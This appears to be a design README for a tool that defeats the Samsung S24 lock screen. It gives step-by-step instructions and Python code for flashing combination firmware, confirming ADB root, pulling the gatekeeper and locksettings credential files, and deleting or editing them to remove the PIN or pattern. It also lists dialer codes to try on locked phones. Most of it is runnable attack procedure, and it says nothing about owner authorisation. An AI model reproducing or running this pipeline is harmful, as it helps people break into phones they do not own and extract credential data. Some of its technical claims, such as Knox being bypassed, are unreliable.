# Samsung S24 Unlock Pipeline

## Core Problem
S24 (OneUI 6.x/7.x, Android 14/15) with pattern/PIN lock has USB debugging disabled.
No software can talk to it over USB from the locked OS state.

## Remote Methods (No USB, Preserves Data)
1. **Samsung Find My Mobile** — https://findmymobile.samsung.com — requires Samsung account + internet
2. **Google Find My Device** — https://www.google.com/android/find — Google account + internet

## USB Detection States
```python
SAMSUNG_PID_DOWNLOAD = 0x685d  # Samsung in Download Mode
SAMSUNG_PID_LOCKED = 0x68e3    # Samsung locked (no ADB)
SAMSUNG_PID_COMBO = 0x68ed     # Combo firmware (ADB root)
```

Detect with: `lsusb | grep 04e8` + parse PID, or `adb devices -l`

## Hardware Pipeline (Download Mode → Combo Firmware)

### Step 1: Enter Download Mode
- Power OFF completely (Volume Down + Power 7s)
- Volume Down + Power from OFF
- At warning screen: Volume UP
- USB VID:PID = 04e8:685d

### Step 2: Flash Combination Firmware
- File: `COMBINATION_FA81_<model>*.tar.md5`
  - SM-S921 = S24 base, SM-S926 = S24+, SM-S928 = S24 Ultra
- Use Odin3 (Windows) or Heimdall (Linux)
- UNCHECK "Auto Reboot" in Odin
- Wait for PASS! in green

### Step 3: Boot Combo Firmware
- Exit download mode manually (Volume Down + Power)
- Engineering firmware boots with ADB root (no lock screen)
- First boot: 90-120 seconds
- Verify with adb — must confirm root:
  ```python
  def wait_for_combo_adb(timeout=120):
      deadline = time.time() + timeout
      while time.time() < deadline:
          r = subprocess.run(["adb", "devices", "-l"], capture_output=True, text=True, timeout=5)
          if "device" in r.stdout and "unauthorized" not in r.stdout:
              r2 = subprocess.run(["adb", "shell", "id"], capture_output=True, text=True, timeout=5)
              if "root" in r2.stdout:
                  return True  # ADB root confirmed
          time.sleep(3)
      return False
  ```

### Step 4: Extract Lock Screen Data
```python
paths = [
    "/data/system_de/0/spgatekeeper.db",       # Gatekeeper password hash DB
    "/data/system_de/0/device_policies.xml",   # Failed attempt counter
    "/data/system/locksettings.db",            # Lock settings (type, salt)
    "/data/system/gatekeeper.password.key",     # Auth key for password
    "/data/system/gatekeeper.pattern.key",      # Auth key for pattern
]
for path in paths:
    subprocess.run(["adb", "pull", path, local_path], timeout=15)
```

### Step 5: Clear Lock Screen (3 methods)
```python
# Method A: Delete gatekeeper key files (quickest)
for cmd in [
    "rm -f /data/system/gatekeeper.password.key",
    "rm -f /data/system/gatekeeper.pattern.key",
    "rm -f /data/system_de/0/spgatekeeper.db",
]:
    subprocess.run(["adb", "shell", cmd], timeout=10)

# Method B: Edit locksettings.db via sqlite3 (preserves wallpaper)
for cmd in [
    'sqlite3 /data/system/locksettings.db "DELETE FROM locksettings WHERE name=\'lockscreen.password_type\';"',
    'sqlite3 /data/system/locksettings.db "DELETE FROM locksettings WHERE name LIKE \'%lock%\' AND name NOT LIKE \'%weather%\';"',
]:
    subprocess.run(["adb", "shell", cmd], timeout=10)

# Method C: Nuclear — delete ALL credential data
for cmd in [
    "rm -rf /data/system_de/0/*gatekeeper*",
    "rm -rf /data/system_de/0/*locksettings*",
    "rm -rf /data/system/locksettings*",
    "rm -f /data/system/device_policies.xml",
]:
    subprocess.run(["adb", "shell", cmd], timeout=10)
```

### Step 6: Reboot
```python
subprocess.run(["adb", "shell", "reboot"], timeout=10)
```

## Key Android 14+ Lock Screen Files
- `/data/system_de/0/spgatekeeper.db` — SQLite DB with hashed credentials
- `/data/system/locksettings.db` — Lock settings (type, salt, flags)
- `/data/system/gatekeeper.password.key` — Auth key for password
- `/data/system/gatekeeper.pattern.key` — Auth key for pattern
- `/data/system/device_policies.xml` — Failed attempts, wipe threshold

## 2026 Samsung Dialer Codes
These codes can be tried during FRP setup or even from the emergency dialer on
a locked phone:
- `*#08#` — Engineering mode
- `*#27663368378#` — Factory menu
- `*#367635#` — Service menu

## Knox Vault Note
Samsung Knox Vault stores lock credentials in a hardware-isolated processor.
The gatekeeper.key files are stored in the filesystem but validated by Knox.
Software clear via combo firmware works because Knox is bypassed at the
bootloader level when engineering firmware is flashed.

## Implementation
The tool lives at `backend/exploits/android/unlock/samsung_unlock.py` and
contains the full pipeline as a CLI:
```bash
python3 -m backend.exploits.android.unlock.samsung_unlock --detect       # Check USB
python3 -m backend.exploits.android.unlock.samsung_unlock                # Full pipeline
python3 -m backend.exploits.android.unlock.samsung_unlock --remote-only  # Web options
```
